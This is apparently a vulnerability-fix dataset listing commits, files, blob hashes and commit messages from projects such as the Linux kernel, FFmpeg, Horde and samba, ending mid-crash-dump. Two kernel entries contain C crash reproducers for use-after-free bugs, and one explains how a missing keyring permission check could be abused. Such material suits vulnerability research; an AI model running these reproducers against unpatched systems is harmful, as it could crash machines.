Blob(s) In Commit: 
    b466c312cba492863d5f00d128f61603cecafe9d
Blob(s) Before Fix: 
    2248731b38a2cdb53b3ef9c8563fd8ec3f08e8fc
Projects:
    0-T-0_radare2
Commit Message for 0b973e28166636e0ff1fad80baa0385c9c09c53a:
Fixed crash in elf.c with 32bit r2 when shdr->sh_size > max size_t

======================================================================
Commit With Fix: 
    d31c4d3cbdbe01ea3ded16a584de94149ecd31d9
File(s) In Commit: 
    libr/bin/bin.c
Blob(s) In Commit: 
    b5fffe88bc3e9f5ee64dbd0114b799a9a68acee7
Blob(s) Before Fix: 
    fbb8a8025b05ad21ab8185f2f803dcac637a4463
Projects:
    0-T-0_radare2
Commit Message for d31c4d3cbdbe01ea3ded16a584de94149ecd31d9:
Fix #8748 - Fix oobread on string search

======================================================================
Commit With Fix: 
    cd4663dc80323ba64989d0c103d51ad3ee0e9c2f
File(s) In Commit: 
    libavcodec/smacker.c
Blob(s) In Commit: 
    7deccffa5497265c66d1ee5ed8acf04bacfee575
Blob(s) Before Fix: 
    0e057a1c2a8821c311a925d8e21fe39f18155881
Projects:
    00ERNEST00_FFmpeg
Commit Message for cd4663dc80323ba64989d0c103d51ad3ee0e9c2f:
smacker: add sanity check for length in smacker_decode_tree()\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n\nBug-Id: 1098 Cc: libav-stable@libav.org Signed-off-by: Sean McGovern <gseanmcg@gmail.com>

======================================================================
Commit With Fix: 
    d16c24542b2f96a194d43a73c2e5778822b9cb47
File(s) In Commit: 
    src/snmp.c
Blob(s) In Commit: 
    6e26ad59da4b2b05da4e8813754392fa66d3c43e
Blob(s) Before Fix: 
    287f44b4e9ba5f5fbeb0b3b61f97f4f65475f17f
Projects:
    01BTC10_collectd
Commit Message for d16c24542b2f96a194d43a73c2e5778822b9cb47:
snmp plugin: Fix double free of request PDU\n\nsnmp_sess_synch_response() always frees request PDU, in both case of request error and success. If error condition occurs inside of `while (status == 0)` loop, double free of `req` happens.\n\nIssue: #2291 Signed-off-by: Florian Forster <octo@collectd.org>

======================================================================
Commit With Fix: 
    5f06d724bc05580e7f203db2d4a4905fc1127f98
File(s) In Commit: 
    mistune.py
Blob(s) In Commit: 
    5b05fcb3658ad7bdee0301ac54dda7abc52d1ee7
Blob(s) Before Fix: 
    3c82c8e9d2358501cf6d80e524a4d70a1d559759
    d6ecf7eed4264b05ff9cd052ae348e67c9d343c3
Projects:
    0wave_mistune
Commit Message for 5f06d724bc05580e7f203db2d4a4905fc1127f98:
Fix CVE-2017-16876

======================================================================
Commit With Fix: 
    c16791d28d1ca3139e398145f0c6565c523c291a
File(s) In Commit: 
    src/Whoops/Util/TemplateHelper.php
Blob(s) In Commit: 
    00f6ae499eaf656a76546804623cd7bfc21526e7
Blob(s) Before Fix: 
    0588924d05edb587294636e1902c6e15324d6a3a
    0fc23af2709f1d5b8cfc5101e2ef1a7dca37d53e
    2b4c7f2b0f4d11f70ed8f8d51d996f954256b1a3
    35531349e88433a5b1b1521072dd2483c78517b9
    47474d7d7c33e91c86b38f8275f89c064c99d4b4
    71690de218c8ec9f146cc58ba02fa0da4ab6f14f
    7df1307c1d611c23cd00938dff592af8bc2720be
    89e56f382ec4da003e7732a6341a4a07058fb0c4
    98153e9b4f0bc75fd0ff2b5a4a70518682ff854d
    9c7cec23bc1130b1dab96f94f63831325030978a
    a432a2b864d6e09ab5ff05f32eddaf10065e1e12
    c8e7f6bb47dae3a2cdfc1b74fe303c85b15b0083
    e701635f4a72c830f7ae7bf8d4c25d5a87bc64d5
Projects:
    2bj_whoops
Commit Message for c16791d28d1ca3139e398145f0c6565c523c291a:
TemplateHelper: fix XSS if Symfony dumper is not available

======================================================================
Commit With Fix: 
    09d90141292f9ec516a7a2007bf828ce2bbdf60d
File(s) In Commit: 
    lib/Event.php
Blob(s) In Commit: 
    462f90b2206ba2117591ac394a986054d7007517
Blob(s) Before Fix: 
    74e0169db2404c134777976c791313aa27c58f72
Projects:
    horde_kronolith
Commit Message for 09d90141292f9ec516a7a2007bf828ce2bbdf60d:
Bug: 14857\n\nPrevent XSS in event's URL field.

======================================================================
Commit With Fix: 
    fb2113bbcd04bd4a28c46aad0889fb0a3979a230
File(s) In Commit: 
    lib/View/Sidebar.php
Blob(s) In Commit: 
    fed0734b410c337436b4a199f776c3e6f5d7c4ed
Blob(s) Before Fix: 
    e896326236294d86fd1bfc5afde2a3ae86c43acf
Projects:
    horde_base
Commit Message for fb2113bbcd04bd4a28c46aad0889fb0a3979a230:
Bug: 14857\n\nEscape user supplied color data, preventing XSS vuln.

======================================================================
Commit With Fix: 
    39f740068ad21618f6f70b6e37855c61cadbd716
File(s) In Commit: 
    js/kronolith.js
Blob(s) In Commit: 
    d3b19dbf82498a01eb4d85ca938101b73163e46d
Blob(s) Before Fix: 
    60aeac8c49176fe44b7a80c5b64f98388272d225
Projects:
    horde_kronolith
Commit Message for 39f740068ad21618f6f70b6e37855c61cadbd716:
Bug: 14857\n\nEscape user-provided resource name when outputting. Prevents XSS vuln.

======================================================================
Commit With Fix: 
    7d5890b2fc63285f010d5845913894dd71cf232c
File(s) In Commit: 
    app/Controller/UsersController.php
Blob(s) In Commit: 
    431736113bdd01a2589f61e51454bf074c23d295
Blob(s) Before Fix: 
    1b7f7352839489313420c5d41530c9ebe8f60d68
    c140fe80e7791424a55452950982ef76ccfbac69
Projects:
    0-vortex_MISP
Commit Message for 7d5890b2fc63285f010d5845913894dd71cf232c:
fix: Leaking of hashed passwords in the audit logs fixed\n\n- Scope was limited due to the audit log access restrictions to site/org admins

======================================================================
Commit With Fix: 
    373c4557d2aa362702c4c2d41288fb1e54990b7c
File(s) In Commit: 
    mm/pagewalk.c
Blob(s) In Commit: 
    23a3e415ac2ce592bc0e7e21f3deb957e89dff7f
Blob(s) Before Fix: 
    03761577ae86e462cf2a7218892be7a28ae5877d
    0c639652849b81a620a4bf52cc253c8de637b893
    1a41979654150f05514cd25f0da685fe397f1104
    207244489a681d10f16c318c0a6ff0423b5fe30b
    29f2f8b853ae51be4f9e35fbc1495ad69297ff82
    2f5cf10ff6607483433cc3a059d28023afa9a042
    60f7856e508fb90e6010feadad2233f4d148341e
    7d973f63088cb550186d498de8ca0bcc5e580273
    83673515ca9deebf03832a7cc1cf74e18e7452f5
    8bd4afa83cb89f31ccf823c751cc081dd583a263
    9056d22d28808839cc1a65b41353d3b0f52779dc
    c3084ff2569d2f297ed369874ba839aadc93785e
    d95341cffc2f69561b4b657360178b5e6eddf082
Projects:
    0-T-0_ps4-linux
Commit Message for 373c4557d2aa362702c4c2d41288fb1e54990b7c:
mm/pagewalk.c: report holes in hugetlb ranges\n\nThis matters at least for the mincore syscall, which will otherwise copy uninitialized memory from the page allocator to userspace.  It is probably also a correctness error for /proc/$pid/pagemap, but I haven't tested that.\n\nRemoving the `walk->hugetlb_entry` condition in walk_hugetlb_range() has no effect because the caller already checks for that.\n\nThis only reports holes in hugetlb ranges to callers who have specified a hugetlb_entry callback.\n\nThis issue was found using an AFL-based fuzzer.\n\nv2:  - don't crash on ->pte_hole==NULL (Andrew Morton)  - add Cc stable (Andrew Morton)\n\nFixes: 1e25a271c8ac ("mincore: apply page table walker on do_mincore()") Signed-off-by: Jann Horn <jannh@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2b7e8665b4ff51c034c55df3cff76518d1a9ee3a
File(s) In Commit: 
    kernel/fork.c
Blob(s) In Commit: 
    cbbea277b3fba7a8a1ff73ffaf620202a706036a
Blob(s) Before Fix: 
    17921b0390b4f91113bcf8c9ccac5c1225751460
    500ce64517d93e68ebfa856d244c51f148faa7ba
    52e725d4a866b4ac30f16b4db075b9b197e4e53d
    623259fc794d034f7b4ab9144e2a61a7233381b6
    6c463c80e93de8c3be3180f3cbd8694b955a1ac3
    9fe67bedeeba27ccb1ce5364a08a0139fc200795
    e075b7780421dee1d8243b9dc178248398c5f189
    e53770d2bf956bf5bf6ec1a42c75121552713da6
Projects:
    0-T-0_ps4-linux
Commit Message for 2b7e8665b4ff51c034c55df3cff76518d1a9ee3a:
fork: fix incorrect fput of ->exe_file causing use-after-free\n\nCommit 7c051267931a ("mm, fork: make dup_mmap wait for mmap_sem for write killable") made it possible to kill a forking task while it is waiting to acquire its ->mmap_sem for write, in dup_mmap().\n\nHowever, it was overlooked that this introduced an new error path before a reference is taken on the mm_struct's ->exe_file.  Since the ->exe_file of the new mm_struct was already set to the old ->exe_file by the memcpy() in dup_mm(), it was possible for the mmput() in the error path of dup_mm() to drop a reference to ->exe_file which was never taken.\n\nThis caused the struct file to later be freed prematurely.\n\nFix it by updating mm_init() to NULL out the ->exe_file, in the same place it clears other things like the list of mmaps.\n\nThis bug was found by syzkaller.  It can be reproduced using the following C program:\n\n    #define _GNU_SOURCE     #include <pthread.h>     #include <stdlib.h>     #include <sys/mman.h>     #include <sys/syscall.h>     #include <sys/wait.h>     #include <unistd.h>\n\n    static void *mmap_thread(void *_arg)     {         for (  ) {             mmap(NULL, 0x1000000, PROT_READ,                  MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0)          }     }\n\n    static void *fork_thread(void *_arg)     {         usleep(rand() % 10000)          fork()      }\n\n    int main(void)     {         fork()          fork()          fork()          for (  ) {             if (fork() == 0) {                 pthread_t t \n\n                pthread_create(&t, NULL, mmap_thread, NULL)                  pthread_create(&t, NULL, fork_thread, NULL)                  usleep(rand() % 10000)                  syscall(__NR_exit_group, 0)              }             wait(NULL)          }     }\n\nNo special kernel config options are needed.  It usually causes a NULL pointer dereference in __remove_shared_vm_struct() during exit, or in dup_mmap() (which is usually inlined into copy_process()) during fork. Both are due to a vm_area_struct's ->vm_file being used after it's already been freed.\n\nGoogle Bug Id: 64772007\n\nLink: http://lkml.kernel.org/r/20170823211408.31198-1-ebiggers3@gmail.com Fixes: 7c051267931a ("mm, fork: make dup_mmap wait for mmap_sem for write killable") Signed-off-by: Eric Biggers <ebiggers@google.com> Tested-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: Ingo Molnar <mingo@kernel.org> Cc: Konstantin Khlebnikov <koct9i@gmail.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: <stable@vger.kernel.org>	[v4.7+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ccd5b3235180eef3cfec337df1c8554ab151b5cc
File(s) In Commit: 
    arch/x86/include/asm/mmu_context.h
Blob(s) In Commit: 
    7a234be7e29846618cbdafb0153705cb8a8566b3
Blob(s) Before Fix: 
    1de72ce514cd5561dbafea43996d909f449f8766
    265c907d7d4c9b8c69e24792a20c5a3dfb6c95ee
    306c7e12af55b6518943dcf6fe2ab89745efdd1b
    396348196aa779aeb55bea2b1d9b0782475e3558
    68b329d77b3a406365f3aa06a6aaf6a8bae24c81
    8463a136f711da9a5748ee33033ef16d7e5dc538
    8e0a9fe86de466eee5a520aa8ef9776a0e0e637d
    9024236693d2b1e6756e4e9a62f72102c7531d46
    bfd9b2a35a0b14aa879ac9973202ef882dae52d7
    c931b88982a0ff59e3b67947cc606e452f327dc0
    d8abfcf524d102573a53e456fec24592cf933a01
    ecfcb6643c9b4502fa8d89b99dd8b351a9665b73
Projects:
    0-T-0_ps4-linux
Commit Message for ccd5b3235180eef3cfec337df1c8554ab151b5cc:
x86/mm: Fix use-after-free of ldt_struct\n\nThe following commit:\n\n  39a0526fb3f7 ("x86/mm: Factor out LDT init from context init")\n\nrenamed init_new_context() to init_new_context_ldt() and added a new init_new_context() which calls init_new_context_ldt().  However, the error code of init_new_context_ldt() was ignored.  Consequently, if a memory allocation in alloc_ldt_struct() failed during a fork(), the ->context.ldt of the new task remained the same as that of the old task (due to the memcpy() in dup_mm()).  ldt_struct's are not intended to be shared, so a use-after-free occurred after one task exited.\n\nFix the bug by making init_new_context() pass through the error code of init_new_context_ldt().\n\nThis bug was found by syzkaller, which encountered the following splat:\n\n    BUG: KASAN: use-after-free in free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116     Read of size 4 at addr ffff88006d2cb7c8 by task kworker/u9:0/3710\n\n    CPU: 1 PID: 3710 Comm: kworker/u9:0 Not tainted 4.13.0-rc4-next-20170811 #2     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011     Call Trace:      __dump_stack lib/dump_stack.c:16 [inline]      dump_stack+0x194/0x257 lib/dump_stack.c:52      print_address_description+0x73/0x250 mm/kasan/report.c:252      kasan_report_error mm/kasan/report.c:351 [inline]      kasan_report+0x24e/0x340 mm/kasan/report.c:409      __asan_report_load4_noabort+0x14/0x20 mm/kasan/report.c:429      free_ldt_struct.part.2+0x10a/0x150 arch/x86/kernel/ldt.c:116      free_ldt_struct arch/x86/kernel/ldt.c:173 [inline]      destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171      destroy_context arch/x86/include/asm/mmu_context.h:157 [inline]      __mmdrop+0xe9/0x530 kernel/fork.c:889      mmdrop include/linux/sched/mm.h:42 [inline]      exec_mmap fs/exec.c:1061 [inline]      flush_old_exec+0x173c/0x1ff0 fs/exec.c:1291      load_elf_binary+0x81f/0x4ba0 fs/binfmt_elf.c:855      search_binary_handler+0x142/0x6b0 fs/exec.c:1652      exec_binprm fs/exec.c:1694 [inline]      do_execveat_common.isra.33+0x1746/0x22e0 fs/exec.c:1816      do_execve+0x31/0x40 fs/exec.c:1860      call_usermodehelper_exec_async+0x457/0x8f0 kernel/umh.c:100      ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431\n\n    Allocated by task 3700:      save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59      save_stack+0x43/0xd0 mm/kasan/kasan.c:447      set_track mm/kasan/kasan.c:459 [inline]      kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551      kmem_cache_alloc_trace+0x136/0x750 mm/slab.c:3627      kmalloc include/linux/slab.h:493 [inline]      alloc_ldt_struct+0x52/0x140 arch/x86/kernel/ldt.c:67      write_ldt+0x7b7/0xab0 arch/x86/kernel/ldt.c:277      sys_modify_ldt+0x1ef/0x240 arch/x86/kernel/ldt.c:307      entry_SYSCALL_64_fastpath+0x1f/0xbe\n\n    Freed by task 3700:      save_stack_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59      save_stack+0x43/0xd0 mm/kasan/kasan.c:447      set_track mm/kasan/kasan.c:459 [inline]      kasan_slab_free+0x71/0xc0 mm/kasan/kasan.c:524      __cache_free mm/slab.c:3503 [inline]      kfree+0xca/0x250 mm/slab.c:3820      free_ldt_struct.part.2+0xdd/0x150 arch/x86/kernel/ldt.c:121      free_ldt_struct arch/x86/kernel/ldt.c:173 [inline]      destroy_context_ldt+0x60/0x80 arch/x86/kernel/ldt.c:171      destroy_context arch/x86/include/asm/mmu_context.h:157 [inline]      __mmdrop+0xe9/0x530 kernel/fork.c:889      mmdrop include/linux/sched/mm.h:42 [inline]      __mmput kernel/fork.c:916 [inline]      mmput+0x541/0x6e0 kernel/fork.c:927      copy_process.part.36+0x22e1/0x4af0 kernel/fork.c:1931      copy_process kernel/fork.c:1546 [inline]      _do_fork+0x1ef/0xfb0 kernel/fork.c:2025      SYSC_clone kernel/fork.c:2135 [inline]      SyS_clone+0x37/0x50 kernel/fork.c:2129      do_syscall_64+0x26c/0x8c0 arch/x86/entry/common.c:287      return_from_SYSCALL_64+0x0/0x7a\n\nHere is a C reproducer:\n\n    #include <asm/ldt.h>     #include <pthread.h>     #include <signal.h>     #include <stdlib.h>     #include <sys/syscall.h>     #include <sys/wait.h>     #include <unistd.h>\n\n    static void *fork_thread(void *_arg)     {         fork()      }\n\n    int main(void)     {         struct user_desc desc = { .entry_number = 8191 } \n\n        syscall(__NR_modify_ldt, 1, &desc, sizeof(desc)) \n\n        for (  ) {             if (fork() == 0) {                 pthread_t t \n\n                srand(getpid())                  pthread_create(&t, NULL, fork_thread, NULL)                  usleep(rand() % 10000)                  syscall(__NR_exit_group, 0)              }             wait(NULL)          }     }\n\nNote: the reproducer takes advantage of the fact that alloc_ldt_struct() may use vmalloc() to allocate a large ->entries array, and after commit:\n\n  5d17a73a2ebe ("vmalloc: back off when the current task is killed")\n\nit is possible for userspace to fail a task's vmalloc() by sending a fatal signal, e.g. via exit_group().  It would be more difficult to reproduce this bug on kernels without that commit.\n\nThis bug only affected kernels with CONFIG_MODIFY_LDT_SYSCALL=y.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com> Acked-by: Dave Hansen <dave.hansen@linux.intel.com> Cc: <stable@vger.kernel.org> [v4.6+] Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Brian Gerst <brgerst@gmail.com> Cc: Christoph Hellwig <hch@lst.de> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Michal Hocko <mhocko@suse.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Rik van Riel <riel@redhat.com> Cc: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: linux-mm@kvack.org Fixes: 39a0526fb3f7 ("x86/mm: Factor out LDT init from context init") Link: http://lkml.kernel.org/r/20170824175029.76040-1-ebiggers3@gmail.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    a9c97eea6c268fb83d93a817d58bac75e0d2599e
File(s) In Commit: 
    custom/run.cgi
Blob(s) In Commit: 
    375b041b930642b6b74844ac9d59cba5b5f4ab23
Blob(s) Before Fix: 
    327de410d1795d04dcaa2058b3f54998404abd39
Projects:
    Anialation81_webmin
Commit Message for a9c97eea6c268fb83d93a817d58bac75e0d2599e:
HTML escape command description

======================================================================
Commit With Fix: 
    1a6a6e462dc2ac6111f9e02c6852ddec4849b887
File(s) In Commit: 
    kdc/kerberos5.c
Blob(s) In Commit: 
    1582fee751b0442c578ee176db44da74edc26a66
Blob(s) Before Fix: 
    675b406b8277262e2498b9f01c99797ba6356930
    95a74927f78a749a645823d37cf59a5dffecab80
    98989bd6444fbf8e63496a4aecd9c387b5a1fdd6
Projects:
    17500mph_samba
Commit Message for 1a6a6e462dc2ac6111f9e02c6852ddec4849b887:
Security: Avoid NULL structure pointer member dereference\n\nThis can happen in the error path when processing malformed AS requests with a NULL client name.  Bug originally introduced on Fri Feb 13 09:26:01 2015 +0100 in commit:\n\n    a873e21d7c06f22943a90a41dc733ae76799390d\n\n    kdc: base _kdc_fast_mk_error() on krb5_mk_error_ext()\n\nOriginal patch by Jeffrey Altman <jaltman@secure-endpoints.com>

======================================================================
Commit With Fix: 
    8f659a03a0ba9289b9aeb9b4470e6fb263d6f483
File(s) In Commit: 
    net/ipv4/raw.c
Blob(s) In Commit: 
    125c1eab3eaa6d894804c3aa8918aa7fcc736ca0
Blob(s) Before Fix: 
    00fa91d638b633a12c2dd0ef0335478af45595c9
    21800979ed621a17b0871bab18159d79db729050
    33b70bfd1122f08f4897ea6a68eb51e3a74bb1e5
    33df4d76db2d948d620ffc809574b364ae24ad4b
    3ccda5ae8a27b24855c86cf0f3e858c648fc5295
    561cd4b8fc6e07b49222d788651e93c42ee3adcb
    56909c8fa02515fb0ccdaca4b7ede7a18c928825
    59d8770055ed08ac6c0bb86717a8be8beaa04228
    7113bae4e6a0c02726e0e11c33415b6779b7d04b
    7e1588ccf60d5de98c16e302f8c71ffe137a94c4
    8119e1f66e036ad2a8372bf24dd943c7d9631d8e
    8f2cd7d0972096baa344b5ec508a2a2d914b8ca9
    9879b73d55653b983e770737c8359db5c6502b50
    b0bb5d0a30bd50b84f0d6a3bccd39b996b4678b3
    b4a1c42a627f211253787000da1697dd4bd4750f
    bdffad875691ce7240040cfaf188eb4cf3ec7307
    c77aac75759d94fc2dca10aee4f83d7ece21b1a7
    ed94875bfa7e5a4352e432dde7a41771725bd95f
Projects:
    0-T-0_ps4-linux
Commit Message for 8f659a03a0ba9289b9aeb9b4470e6fb263d6f483:
net: ipv4: fix for a race condition in raw_sendmsg\n\ninet->hdrincl is racy, and could lead to uninitialized stack pointer usage, so its value should be read only once.\n\nFixes: c008ba5bdc9f ("ipv4: Avoid reading user iov twice after raw_probe_proto_opt") Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7c6f74e43008b2397160775696c67acbab87911d
File(s) In Commit: 
    inc/conv.php
Blob(s) In Commit: 
    6f0f58ff84c813ac4547d0ee0b38b51a3d3c2404
Blob(s) Before Fix: 
    2a9312adbe8088c862bab9ee822bc5cba2176a60
Projects:
    Ikse_blogotext
Commit Message for 7c6f74e43008b2397160775696c67acbab87911d:
fix security issue with comment

======================================================================
Commit With Fix: 
    101dc1d37010a1d877d6961ed2f32d089c708e91
File(s) In Commit: 
    admin/maintenance.php
Blob(s) In Commit: 
    17fa55e640d3ae796481886aeb827e421cb46c4a
Blob(s) Before Fix: 
    492cfc0d683a06febe5d444425bfa5bc65d24a07
Projects:
    Ikse_blogotext
Commit Message for 101dc1d37010a1d877d6961ed2f32d089c708e91:
fix windows server zip file name for backup

======================================================================
Commit With Fix: 
    256041d8cab2fdc50678f4d49d916fea25cdb4fd
File(s) In Commit: 
    admin/preferences.php
Blob(s) In Commit: 
    a1b5d6c6fd8d892e371ed02a2c4dccc4d3647de2
Blob(s) Before Fix: 
    3c67d839eb22e48ff17ad335934d1f382e4aa55b
Projects:
    Ikse_blogotext
Commit Message for 256041d8cab2fdc50678f4d49d916fea25cdb4fd:
fix form email security issue

======================================================================
Commit With Fix: 
    4dca6ea1d9432052afb06baf2e3ae78188a4410b
File(s) In Commit: 
    security/keys/request_key.c
Blob(s) In Commit: 
    114f7408feee620b868801cbb53b578e7b44f615
Blob(s) Before Fix: 
    0d625312427831b63ed18784719cd0b424f03a41
    19bbe5e673ef60e4cd893e7caaa71f806653de61
    381411941cc1abbc48a699b1c2c38042f1a05711
    3ae3acf473c8f6e8603fd5d4eff721f31370950b
    43affcf10b22f2d0d4cc033a472b374596d4c578
    486ef6fa393b2cc9d8ceb8cb11f187f97730bd90
    63e63a42db3c0aa4b1ed069e03e8e1f8e9139a32
    7a0c6b666ff03a5e59e979a70fd14ed808b46861
    7dc74138215427bd741db81e064622708298e6d0
    9822e500d50d250f556b210339c9194a432eb167
    a29e3554751e0862003b430ce116f52d182c27bb
    bb4337c7ae1b3978fd5e36d692d8cacf27b89816
    c411f9bb156b205751ae06983e85f547119a245f
    c6880af8b4112039abdffb09baa4044daf416951
    c7a117c9a8f3030d66afc6cbf5767ce5069c813b
    e8036cd0ad5430a87ec2e2ea1496e921ae941b3d
    fd6ba06f25035c69b2e75bc0bc1f658e3c50d341
Projects:
    0-T-0_ps4-linux
Commit Message for 4dca6ea1d9432052afb06baf2e3ae78188a4410b:
KEYS: add missing permission check for request_key() destination\n\nWhen the request_key() syscall is not passed a destination keyring, it links the requested key (if constructed) into the "default" request-key keyring.  This should require Write permission to the keyring.  However, there is actually no permission check.\n\nThis can be abused to add keys to any keyring to which only Search permission is granted.  This is because Search permission allows joining the keyring.  keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_SESSION_KEYRING) then will set the default request-key keyring to the session keyring. Then, request_key() can be used to add keys to the keyring.\n\nBoth negatively and positively instantiated keys can be added using this method.  Adding negative keys is trivial.  Adding a positive key is a bit trickier.  It requires that either /sbin/request-key positively instantiates the key, or that another thread adds the key to the process keyring at just the right time, such that request_key() misses it initially but then finds it in construct_alloc_key().\n\nFix this bug by checking for Write permission to the keyring in construct_get_dest_keyring() when the default keyring is being used.\n\nWe don't do the permission check for non-default keyrings because that was already done by the earlier call to lookup_user_key().  Also, request_key_and_link() is currently passed a 'struct key *' rather than a key_ref_t, so the "possessed" bit is unavailable.\n\nWe also don't do the permission check for the "requestor keyring", to continue to support the use case described by commit 8bbf4976b59f ("KEYS: Alter use of key instantiation link-to-keyring argument") where /sbin/request-key recursively calls request_key() to add keys to the original requestor's destination keyring.  (I don't know of any users who actually do that, though...)\n\nFixes: 3e30148c3d52 ("[PATCH] Keys: Make request-key create an authorisation key") Cc: <stable@vger.kernel.org>	# v2.6.13+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    d76c68109f37cb85b243a1cf0f40313afd2bae68
File(s) In Commit: 
    crypto/pcrypt.c
Blob(s) In Commit: 
    f8ec3d4ba4a80f8eefed739d9e8a852865a7ac02
Blob(s) Before Fix: 
    0edf5b54fc778d6f2f159821496f8bac267bea50
    29a89dad68b664b0dcfefdf29a19631904b21e3f
    309d345ead9582896bde8c5f5c170bf5d0315f66
    61ff946db7484e17ef9cced2f35d66730a596611
    87581bcf27b85cb35de0c04d95a0ca8ab3843a8c
    97bdb8369eae3f975f83ebdafc915589ff3c77d8
    a5718c0a3dc4e8ea4a02121f972f1d31193f48e3
    b2c99dc1c5e2f244bab9cf8fafcedb0860df67f6
    bed8060053933e748dc55661e3b663899acf8303
    c305d4112735cd3b7b18b477299b534b8c0e1b77
    d47cfc47b1b1b359216deed02dcd0f96c8bba98b
    ee9cfb99fe256af06ae7ad5d946c3b76d90de1e9
    f8c920cafe639c8451349e15b3f1e22e19da80e4
Projects:
    0-T-0_ps4-linux
Commit Message for d76c68109f37cb85b243a1cf0f40313afd2bae68:
crypto: pcrypt - fix freeing pcrypt instances\n\npcrypt is using the old way of freeing instances, where the ->free() method specified in the 'struct crypto_template' is passed a pointer to the 'struct crypto_instance'.  But the crypto_instance is being kfree()'d directly, which is incorrect because the memory was actually allocated as an aead_instance, which contains the crypto_instance at a nonzero offset.  Thus, the wrong pointer was being kfree()'d.\n\nFix it by switching to the new way to free aead_instance's where the ->free() method is specified in the aead_instance itself.\n\nReported-by: syzbot <syzkaller@googlegroups.com> Fixes: 0496f56065e0 ("crypto: pcrypt - Add support for new AEAD interface") Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    340d394a789518018f834ff70f7534fc463d3226
File(s) In Commit: 
    drivers/input/serio/i8042.c
Blob(s) In Commit: 
    824f4c1c1f3103dab4596ffc287c438fbc0345b3
Blob(s) Before Fix: 
    020053fa5aaa38fce82b5fc2d6ced8546661c9df
    2a5aca7a85ff789906a3357db58327e0d51b5474
    2d8f9593fb181a4c84211228dc46035af4e79e83
    36e5011a6d21b955a80a3cb8d3216b12dbafa783
    3807c3e971cca79e6ff42b745409ac418487bb0c
    405252a884dd41e233da4399ab109f213becb85a
    454195709a824b3e5a346b3aa9e087672dccdcae
    52c9ebf94729ff5bf6531cc7773902ece632d03b
    62685a76891363b93d1d6a1d4db613fad814686b
    78e4de42efaacec53c29f740fafe490dead2af84
    89abfdb539ac750ff50eca67f77b2fe6898ff6f0
    95a78ccbd847035007bac3e5ea43e5ee04db35de
    986a71c614b0461bce7825ba34fc78aefcd4a7e4
    9ba76ffa61aeeabb3b39a22e5d82971fd38dfe3a
    a2d80d16d557385659d4a0f7888d2e05c1d7df0d
    b4d34086e73f5aac0654e607028f13f59ef771be
    b8bc71569349d8c45fb18dd4a41947cbf3e68581
    c52da651269b094647aee0bfd63812940d06bc24
    c84c685056b997ec325900dca1524828fa03b0b5
    cb5ece77fd7d8c47f29db0400da5184de0939644
    d37a48e099d0d0c63441f28c6da2a77488797cfd
    db91de539ee30bfc14612f0056f3979b884ff4aa
    e4352741c467a8086a3e6f6a9799f7e8c10cefe6
    f5a98af3b325c1f3257759e31a450c67b2fa00a5
Projects:
    0-T-0_ps4-linux
Commit Message for 340d394a789518018f834ff70f7534fc463d3226:
Input: i8042 - fix crash at boot time\n\nThe driver checks port->exists twice in i8042_interrupt(), first when trying to assign temporary "serio" variable, and second time when deciding whether it should call serio_interrupt(). The value of port->exists may change between the 2 checks, and we may end up calling serio_interrupt() with a NULL pointer:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000050 IP: [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 PGD 0 Oops: 0002 [#1] SMP last sysfs file: CPU 0 Modules linked in:\n\nPid: 1, comm: swapper Not tainted 2.6.32-358.el6.x86_64 #1 QEMU Standard PC (i440FX + PIIX, 1996) RIP: 0010:[<ffffffff8150feaf>]  [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 RSP: 0018:ffff880028203cc0  EFLAGS: 00010082 RAX: 0000000000010000 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000282 RSI: 0000000000000098 RDI: 0000000000000050 RBP: ffff880028203cc0 R08: ffff88013e79c000 R09: ffff880028203ee0 R10: 0000000000000298 R11: 0000000000000282 R12: 0000000000000050 R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000098 FS:  0000000000000000(0000) GS:ffff880028200000(0000) knlGS:0000000000000000 CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b CR2: 0000000000000050 CR3: 0000000001a85000 CR4: 00000000001407f0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000ffff0ff0 